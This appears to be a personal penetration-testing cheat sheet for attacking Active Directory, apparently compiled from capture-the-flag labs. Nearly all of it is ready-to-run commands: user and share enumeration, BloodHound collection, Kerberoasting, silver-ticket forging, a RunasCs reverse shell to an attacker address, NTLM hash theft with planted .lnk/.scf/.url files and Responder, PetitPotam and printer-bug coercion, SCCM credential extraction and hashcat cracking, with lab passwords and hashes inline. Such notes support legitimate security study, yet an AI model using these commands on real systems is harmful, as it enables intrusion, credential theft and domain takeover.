#### Find other users
```
nxc smb administrator.htb -u "Olivia" -p "ichliebedich" --rid-brute | grep SidTypeUser
```
or from a shell on the target:
```
net user
```
- local accounts
```
net user <dc_ip> /domain
```
- AD accounts
other tools:
```
GetADUsers.py -all active.htb/svc_tgs -dc-ip 10.129.78.4
```
rpc:
```
rpcclient <dc-ip> -U <user>%<password> -c 'enumdomusers'
```
smb:
```
nxc smb <ip> -u <user> -p <password> --users 
```

---
## Check Services
smb
```
nxc smb <ip> -u <user> -p <password> --shares
```
- shares; if succesful, spider through it [[04 SMB 139,445#spider through and list all files in smb]]
```bash
sudo nxc smb 172.16.5.130 -u forend -p klmcargo2 --groups
```
- list domain groups
```bash
sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
```
- show users currently logged in ie good targets to steal credentials from memory or impersonate

ldap
```
nxc ldap <ip> -u <user> -p <password>
```
mssql
```
nxc mssql <ip> -u <user> -p <password>
```
rdp
```
nxc rdp <ip> -u <user> -p <password>
```
winrm
```
nxc winrm <ip> -u <user> -p <password>
```

enum4linux
```
enum4linux -a -u "fmcsorley" -p "CrabSharkJellyfish192" 192.168.199.122
```

---
#### run bloodhound remotely
```
bloodhound-ce-python -c All -dc FOREST.htb.local -gc FOREST.htb.local -ns 10.129.175.196 -d htb.local -u svc-alfresco -p 's3rvice'
```
or use nxc:
```
nxc ldap administrator.htb -u Olivia -p ichliebedich --bloodhound --collection All --dns-tcp --dns-server 10.10.11.42
```
or if creds work with shell, can run SharpHound
```
. .\SharpHound.ps1
```
```
Invoke-BloodHound -CollectionMethod All
```

---
#### Kerberoast
```
GetUserSPNs.py lab.enterprise.thm/nik:'ToastyBoi!' -k -dc-ip 10.10.0.36 -request
```

```
MATCH (u:User) WHERE u.hasspn=true AND u.enabled=true 
AND NOT u.objectid ENDS WITH '-502' 
AND NOT COALESCE(u.gmsa, false) = true 
AND NOT COALESCE(u.asm, false) = true 
RETURN u
```
- bloodhound query
```
Rubeus.exe kerberoast
```

---
#### Lateral movement with low-level creds
When a low-privilege user (e.g., svc) isn’t in the Remote Users group and remote execution (e.g., WinRM) isn’t available:
- host RunAsCs.exe on python server to upload:
	- `python -m http.server 80`
- set up listener:
	- `rlwrap -cAr nc -lvnp 6969`
- upload RunAsCs.exe to svc level shell:
	- `powershell -c wget 10.10.14.172/RunasCs.exe -outfile r.exe`
- run RunasCs.exe:
```
.\r.exe C.Bum Tikkycoll_431012284 -r 10.10.14.172:6969 cmd
```
- should create new shell in listener as c.bum
	- c.bum:Tikkycoll_431012284 are creds
	- 10.10.14.172 is tun0 on local machine

---
#### if creds are valid, but nxc doesn't show pwned for winrm, run ldeep:
```
ldeep ldap -u tracy.white -p 'zqwj041FGX' -d nara-security.com -s ldap://nara-security.com add_to_group "CN=TRACY WHITE,OU=STAFF,DC=NARA-SECURITY,DC=COM" "CN=REMOTE ACCESS,OU=remote,DC=NARA-SECURITY,DC=COM"
```
- adds user to remote access group, so evil-winrm should work afterward
- because of conflicting ldap3 python module with bloodhound, set up ldeep to run in virtual environment with alias so `&& deactivate` just exits that

---
#### ***Silver Ticket***
have low level creds, check for SID(from `enum4linux` or `lookupsid.py`) and ServicePrincipalName (from `GetUserSPNs.py`) of user to make silver ticket
```
GetUserSPNs.py breach.vl/julia.wong:Computer1 -dc-ip 10.10.10.111 -request
```
- returns ntlmv2 hash (crack with `john`) and ServicePrincipalName like `MSSQLSVC/BREACH.VL:1433` used in `ticketer.py` command below:
```
lookupsid.py breach.vl/julia.wong:computer1@10.10.10.10
```
- copy Domain SID for `ticketer.py` command below
- get nthash from ntlm hash generator from password from https://codebeautify.org/ntlm-hash-generator
	- Trustno1 = 69596C7AA1E8DAEE17F8E78870E25A5C
- - make sure `/etc/hosts` reflects IP for Domain `BREACH.VL`
```
ticketer.py -nthash 69596C7AA1E8DAEE17F8E78870E25A5C
-domain-sid S-1-5-21-2330692793-3312915120-706255856 -domain breach.vl spn 'MSSQLSVC/BREACH.VL:1433@BREACH.VL' -user-id 500 Administrator
```
- will output "saving ticket in Administrator.ccache"
```
export KRB5CCNAME=/home/kali/Desktop/VulnLab/ldap/Administrator.ccache
```
- caches creds
```
mssqlclient.py breach.vl -k -no-pass -windows-auth
```

---
#### PowerView.ps1 (command line alternative to Bloodhound)
```powershell
. .\PowerView.ps1
```
- adds commands to powershell
```powershell
$UsersAcls = Get-DomainObjectAcl -SearchBase "CN=Users,DC=administrator,DC=htb" -ResolveGUIDs
```
- save all user ACLs to variable
```powershell
$UsersAcls | Where-Object { $_.SecurityIdentifier -eq $Olivia.ObjectSID } | Select-Object IdentityReference, ObjectDN, ActiveDirectoryRights | Format-Table -AutoSize
```
- filter $ UsersAcls variable to show rights Olivia has over others
- alternative approach:
To see what rights user (Olivia) has over another user (Michael):
```powershell
$Olivia = Get-ADUser -Identity "olivia" -Properties ObjectSID
```
- saves variable of olivia's SID
```powershell
$MichaelACL = Get-DomainObjectAcl -Identity "CN=Michael Williams,CN=Users,DC=administrator,DC=htb" -ResolveGUIDs
```
- saves Michael's ACL list as a variable
```powershell
$MichaelACL | Where-Object { $_.SecurityIdentifier -eq $Olivia.ObjectSID -and $_.ActiveDirectoryRights -match "GenericAll" } | Select-Object IdentityReference, ActiveDirectoryRights
```
- filters michael's ACL list to show Olivia's rights over him

---
#### Try local authentication
```bash
nxc smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```
- can also work with `-p`

---
#### SCCM
###### Enumeration
```bash
ldapsearch -x -b "dc=example,dc=com" "(cn=SMS*)" 
```
- ldap info related
```powershell
Get-ADObject -Filter 'Name -like "SMS_*"' -Properties *
```
- Find SMS objects (often created by SCCM)
```powershell
Get-ADUser -Filter {SamAccountName -like "*SMS*"} -Properties *
```
- Find related service accounts
###### Exploitation
```bash
sccmdecrypt find -u <username> -d <domain> -p <password> -dc-ip <dc-ip>
```
- extract SCCM config info (look for creds)
```powershell
SharpSCCM.exe local siteInfo
```
- alt windows tool

---
#### Automatic Scanning
```
AD-miner -c -cf Report -u <neo4j_username> -p <neo4j_password>
```

```
PingCastle.exe --healthcheck --server <domain>
```

```
Import-Module .\adPEAS.ps1; Invoke-adPEAS -Domain <domain> -Server <dc_fqdn>

```

BloodHound Quick Wins

---
#### Coerce
###### Drop File Methods
```
nxc smb <dc_ip> -u "<user>" -p "<password>" -M slinky -o NAME=<filename> SERVER=<attacker_ip>
```
- .lnk
```
nxc smb <dc_ip> -u "<user>" -p "<password>" -M scuffy -o NAME=<filename> SERVER=<attacker_ip>
```
- .scf
```
[InternetShortcut]
IconFile=\\<attacker_ip>\%USERNAME%.icon
```
- .url
```
python ntlm_theft.py --generate all --server <kali ip> --filename dank
```
- create malicious files
`sudo responder -I tun0`
- start responder
`smbclient //flight.htb/shared -N`
- connect to empty share (null session in example above)
- `prompt false`
	- prevents being asked to upload files (neccesary)
- `mput *`
	- uploads all files in current directory
	- run from 'dank' directory created with `ntlm_theft.py`
wait for responder to receive ntlm2 hash and crack with hashcat:
```
hashcat -m 5600 -a 0 -o cracked.txt --force hash.txt /usr/share/wordlists/rockyou.txt
```
OR
write access to smb share, try uploading:
```
sudo python3 /opt/hashgrab.py 10.13.64.37 test
```
- IP is tun0 on my kali
- start smb server `smbserver.py smb share/ -smb2support`
- via smbclient.py `smbclient.py narasec/guest:''@192.168.195.30` upload file via `put test.lnk` to `/Documents` or something similar
- should see hash in smb server
###### WebDAV Coerce
```
searchConnectors-ms
```
- enable WebClient
```
nxc smb <dc_ip> -u "<user>" -p "<password>" -M drop-sc
```
- drop SC trigger
Add computer to DNS record (in box was used bc script was found that auth's with web server's found that start with "web" so created web server)
`sudo responder -I tun0`
- capture creds from auth
```
python3 dnstool.py -u intelligence\\Tiffany.Molina -p NewIntelligenceCorpUser9876 --action add --record web-0xdf --data 10.10.14.172 --type A intelligence.htb
```
- adds a new DNS record, which points to my tun0 IP
Launch coerce with <attacker_hostname>@80/x as target???

###### RPC Call Coerce
```
printerbug.py <domain>/<username>:<password>@<printer_ip>
```

```
petitpotam.py -d <domain> -u <user> -p <password> <listener_ip> <target_ip>
```

```
coercer.py -d <domain> -u <user> -p <password> -t <target> -l <attacker_ip>
```

###### Coerce Kerberos
```
dnstool.py -u "<domain>\<user>" -p "<password>" -d "<attacker_ip>" --action add <dns_server_ip> -r "<servername>1UWhRcAAAAAAAAAAAAAAAAAAAAAAABAAAA==" --tcp
```

```
petitpotam.py -u <user> -p <password> -d <domain> <servername>1UWhRc... <target>
```

---
#### Intra ID Connect
```
nxc ldap <dc_ip> -u "<user>" -p "<password>" -M get-desc-users | grep -i MSOL
```
- Find MSOL